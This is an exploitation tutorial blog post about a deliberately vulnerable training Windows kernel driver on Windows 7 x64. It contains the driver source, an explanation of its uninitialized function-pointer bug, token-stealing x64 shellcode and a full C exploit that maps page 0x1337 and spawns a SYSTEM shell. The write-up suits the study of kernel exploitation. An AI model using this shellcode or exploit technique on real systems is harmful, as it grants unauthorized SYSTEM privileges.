---
date: 2014-03-14
title: "Driver dereferenced pointer in Windows 7 x64"
url: /2014/03/14/driver-dereferenced.html
---

In my previous article, I have talked about the exploitation of kernel buffer 
overflow. This time, I will not play with Windows XP x86 but with Windows 7 x64 
on the 0vercl0k’s level 2 driver. 

<!--more-->

0vercl0k have coded this driver for a x86 environment, so we need to do some
changes:

```c
#include <Ntifs.h>
#include <string.h>

#define ERROR(_f_, _status_) DbgPrint("\r\n[!] Error at %s() : 0x%x\r\n", _f_, _status_)
#define IOCTL_F4 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DbgPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0x1337, __VA_ARGS__)

typedef unsigned long DWORD;
typedef unsigned char* PBYTE;
typedef unsigned char BYTE;

typedef enum
{
    ChangeLabel,
    IncreaseAlcoholPercentage,
    DecreaseAlcoholPercentage
} OPERATION;

typedef struct
{
    OPERATION op;
    BYTE alcohol_percentage;
    BYTE label[256];
} FORCE4,
  *PFORCE4;

typedef VOID (*OPERATION_F)(PFORCE4);

//
DRIVER_UNLOAD Unload;
DRIVER_INITIALIZE DriverEntry;
DRIVER_DISPATCH handleIOCTLs;
DRIVER_DISPATCH handleIRP;
VOID ChangeLab(PFORCE4 pBeer);
VOID IncreaseAlcoholPerc(PFORCE4 pBeer);
VOID DecreaseAlcoholPerc(PFORCE4 pBeer);
//

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj , PUNICODE_STRING pRegistryPath)
{
    DWORD i = 0;
    NTSTATUS status;
    UNICODE_STRING deviceName = {0}, symlinkName = {0};
    PDEVICE_OBJECT pDevice = NULL;

    pDriverObj->DriverUnload = Unload;
    DbgPrint("[ Loading.. ]\r\n");

    RtlInitUnicodeString(&deviceName, L"\\Device\\2");
    RtlInitUnicodeString(&symlinkName, L"\\DosDevices\\2");

    DbgPrint("[ Creating the device...]\n");
    IoCreateDevice(
        pDriverObj,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &pDevice
    );

    DbgPrint("[ Linking...]\n");
    IoCreateSymbolicLink(&symlinkName, &deviceName);

    for(; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        pDriverObj->MajorFunction[i] = handleIRP;

    pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = handleIOCTLs;
    return STATUS_SUCCESS;
}

NTSTATUS handleIRP(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    return STATUS_SUCCESS;
}

NTSTATUS handleIOCTLs(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
    #define EL8 0x1337 /* That's el8. */

    PIO_STACK_LOCATION pIoStackLocation = EL8;
    DWORD ioControlCode = EL8, inputBufferLength = EL8;
    PVOID inputBuffer = EL8;
    PFORCE4 pForce4 = EL8;
    OPERATION_F op = EL8;


    pIoStackLocation = IoGetCurrentIrpStackLocation(pIrp);
    ioControlCode = pIoStackLocation->Parameters.DeviceIoControl.IoControlCode;
    inputBufferLength = pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
    inputBuffer = (PVOID)pIrp->AssociatedIrp.SystemBuffer;

    switch(ioControlCode)
    {
        case IOCTL_F4:
        {
            if(inputBufferLength != sizeof(FORCE4))
                DbgPrint("[ It seems someone tried to give another type of beer, I ONLY HANDLE F4 BUDDY. ]\n");
            else
            {
                DbgPrint("[ Hmm I just received an force4, time to analyse this shit ..]\n");
                pForce4 = inputBuffer;

                switch(pForce4->op)
                {
                    case ChangeLabel:
                        op = ChangeLab;
                    break;

                    case IncreaseAlcoholPercentage:
                        op = IncreaseAlcoholPerc;
                    break;

                    case DecreaseAlcoholPercentage:
                        op = DecreaseAlcoholPerc;
                    break;
                }

                /* op will modify your beer */
                op(pForce4);
                pIrp->IoStatus.Information = sizeof(FORCE4);
            }

            break;
        }
    }

    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return pIrp->IoStatus.Status;
}

VOID IncreaseAlcoholPerc(PFORCE4 pBeer)
{
    if(pBeer->alcohol_percentage <= 245)
        pBeer->alcohol_percentage += 10; /* that's a true beer now, don't you think ? */
}

VOID DecreaseAlcoholPerc(PFORCE4 pBeer)
{
    if(pBeer->alcohol_percentage >= 10)
        pBeer->alcohol_percentage -= 10; /* Don't blame me, that's for chix all right ? */
}

VOID ChangeLab(PFORCE4 pBeer)
{
    memset(pBeer->label, 0, 256);

    /* I recommend you my force4 label */
    strcpy(pBeer->label, "-[ 0vercl0kCorporation");
}

VOID Unload(PDRIVER_OBJECT pDrivObj)
{
    DbgPrint("[ Unloading.. ]\n");
    return;
}
```

It's easy to find the bug: `op(pForce4)` executes a function assigned in 
`switch(pForce4->op)`, but if `pForce4->op` is superior to 2, `op` will keep its 
default value `OPERATION_F op = EL8 = 0x1337` and your driver will execute the 
function at address *0x1337*.


## Exploitation

To exploit this, we need to allocate the *0x1337* address and put your shellcode 
in this place. `VirtualAlloc()` will not work because this function fails if 
your `lpAddress` is too small. Therefore, we will use `NtAllocateVirtualMemory` 
to allocate this part of memory.


## Shellcode

We will copy, like in my previous article, the token of your SYSTEM process in 
our process. Do not forget to save and restore the registers in your shellcode 
or you will lose some hours to find the bug... I have used FASM syntax:

```nasm
format PE64 GUI 4.0

start:

; We save the registers
push rbx
push rcx
push rdx
push rdi
push rsi

;--------------------------------
; 			Stack
;--------------------------------
; RSP-8: EPROCESS+0x188 system
;--------------------------------
; RSP-4: EPROCESS+0x188 exploit
;--------------------------------
push 0xFFFFFFFFFFFFFFFF
push 0xFFFFFFFFFFFFFFFF

mov rdx, [gs:qword 0x188]   ; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			
mov rdx, [rdx + 0x70]       ; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS
add rdx, 0x188              ; +0x188 ActiveProcessLinks : _LIST_ENTRY
mov rbx, rdx                ; Our linked list \o/ We save the first structure

searchProcess:
mov rax, [rdx - 0x8]        ; +0x180 UniqueProcessId
cmp rax, 0x4                ; SYSTEM PID
je sysProcFound
mov rcx, 0x4141414141414141 ; Our exploit PID
cmp rax, rcx                ; cmp reg64, imm64 don't exist
je exploitProcFound
 
nextProcess:
mov rdx, [rdx]              ; Next process (Flink)
cmp rdx, rbx                ; We are back at the starting point
je retApp
jmp searchProcess           ; We loop!
 
sysProcFound:
mov [rsp+8], rdx
jmp allPIDFound
 
exploitProcFound:
mov [rsp], rdx
 
allPIDFound:
mov rcx, 0xFFFFFFFFFFFFFFFF
cmp [rsp], rcx
je nextProcess
cmp [rsp+8], rcx
je nextProcess

; We copy the SYSTEM token
pop rdi ; Exploit
pop rsi ; System
mov rax, [rsi + 0x80]       ; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF
mov [rdi + 0x80], rax
 
retApp:
; Restore the registers
pop rsi
pop rdi
pop rdx
pop rcx
pop rbx
ret
```

Note: if you use FASM too, don’t do `mov rdx, [gs:0x188]` but 
`mov rdx, [gs:qword 0x188]`, because FASM compiler will make you a wtf 
compilation and you will lose (again) some hours to debug it.


## Final exploit

```
E:\>exploit.exe
[+] Search ntdll.dll...
[+] Search NtAllocateVirtualMemory...
[+] Search NtFreeVirtualMemory...
[+] Allocate memory...
[+] Copy the shellcode...
[+] Sending force4 structure...
[+] Free the shellcode space...
[+] New username: SystÞme
[+] Executing a new command console to test it...
```

```c
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>
     
#define IOCTL_F4 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DEVICE_NAME "\\\\.\\2"

typedef enum
{
    ChangeLabel,
    IncreaseAlcoholPercentage,
    DecreaseAlcoholPercentage
} OPERATION;

typedef struct
{
    OPERATION op;
    BYTE alcohol_percentage;
    BYTE label[256];
} FORCE4, *PFORCE4;

typedef DWORD (WINAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef DWORD (WINAPI* _NtFreeVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG);

BYTE shellcode[] =  "\x53\x51\x52\x57\x56\x6A\xFF\x6A\xFF\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x52\x70\x48\x81\xC2\x88\x01"
                    "\x00\x00\x48\x89\xD3\x48\x8B\x42\xF8\x48\x83\xF8\x04\x74\x19\x48\xB9\x41\x41\x41\x41\x41\x41\x41\x41\x48\x39"
                    "\xC8\x74\x11\x48\x8B\x12\x48\x39\xDA\x74\x31\xEB\xDD\x48\x89\x54\x24\x08\xEB\x04\x48\x89\x14\x24\x48\xC7\xC1"
                    "\xFF\xFF\xFF\xFF\x48\x39\x0C\x24\x74\xDE\x48\x39\x4C\x24\x08\x74\xD7\x5F\x5E\x48\x8B\x86\x80\x00\x00\x00\x48"
                    "\x89\x87\x80\x00\x00\x00\x5E\x5F\x5A\x59\x5B\xC3";
     
     
void replacePattern(char buffer[], int bufferSize, DWORD64 pattern, DWORD64 value) {
    BOOL found = FALSE;
    int i;
         
    for (i = 0; i < bufferSize; i++) {
        if (*(PDWORD64)(buffer + i) == pattern) {
            found = TRUE;
            *(PDWORD64)(buffer + i) = value;
        }
    }
         
    return found;
}
     
int main()
{
    DWORD byte = 0, addr = 0;
    HANDLE hDevice = NULL;
    DWORD dwNtdll = NULL;
    _NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
    _NtFreeVirtualMemory NtFreeVirtualMemory = NULL;
    DWORDLONG leetAddress = 0x1337;
    DWORD sizeofShellcode = sizeof(shellcode);
    FORCE4 force4 = {0};
    char username[255] = {0};
    DWORD sizeofUsername = 255;
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    strcpy(force4.label, "Ninja!");
    force4.alcohol_percentage = 137;
    force4.op = 0x1337; // op > 2

    printf("[+] Search ntdll.dll...\n");
    dwNtdll = GetModuleHandle("ntdll.dll");
    if(dwNtdll == NULL) {
        printf("Error with GetModuleHandle : %.8x", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[+] Search NtAllocateVirtualMemory...\n");
    NtAllocateVirtualMemory = (_NtAllocateVirtualMemory) GetProcAddress(dwNtdll, "NtAllocateVirtualMemory");
    if(NtAllocateVirtualMemory == NULL) {
        printf("[-] Error with GetProcAddress : %.8x\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[+] Search NtFreeVirtualMemory...\n");
    NtFreeVirtualMemory = (_NtFreeVirtualMemory) GetProcAddress(dwNtdll, "NtFreeVirtualMemory");
    if(NtFreeVirtualMemory == NULL) {
        printf("[-] Error with GetProcAddress : %.8x\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[+] Allocate memory...\n");
    addr = NtAllocateVirtualMemory(GetCurrentProcess(), &leetAddress, NULL, &sizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(addr != 0) {
        printf("[-] Error with NtAllocateVirtualMemory : %.8x\n", addr);
        return EXIT_FAILURE;
    }
     
    printf("[+] Copy the shellcode...\n");
    replacePattern(shellcode, sizeof(shellcode), 0x4141414141414141, GetCurrentProcessId()); // Process PID
    memcpy(0x1337, shellcode, sizeof(shellcode));
     
     
    hDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Error with Createfile : %.8x.\n", GetLastError());
        return EXIT_FAILURE;
    }
     
    printf("[+] Sending force4 structure...\n");
    DeviceIoControl(hDevice, IOCTL_F4, &force4, sizeof(force4), &force4, sizeof(force4), &byte, NULL);
    CloseHandle(hDevice);

    printf("[+] Free the shellcode space...\n");
    NtFreeVirtualMemory(GetCurrentProcess(), &leetAddress, &sizeofShellcode, MEM_RELEASE);

    GetUserNameA(username, &sizeofUsername);
    printf("[+] New username: %s\n", username);

    printf("[+] Executing a new command console to test it...\n");
    si.cb = sizeof(si); 
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
     
    return EXIT_SUCCESS;
}
```
